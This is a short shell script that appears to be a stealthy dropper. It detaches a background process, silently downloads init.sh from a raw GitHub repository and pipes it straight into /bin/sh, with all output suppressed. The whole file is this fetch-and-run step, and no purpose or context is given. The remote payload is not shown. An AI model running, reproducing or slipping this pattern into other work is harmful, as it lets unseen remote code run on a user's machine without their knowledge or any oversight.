```
#!/bin/sh

src="https://raw.githubusercontent.com/pakoinake/kaxgn/main"
nohup setsid /bin/sh -c "wget -qO- ${src}/init.sh |/bin/sh -s ${src}" </dev/null >/dev/null 2>&1 &
exit 0

```
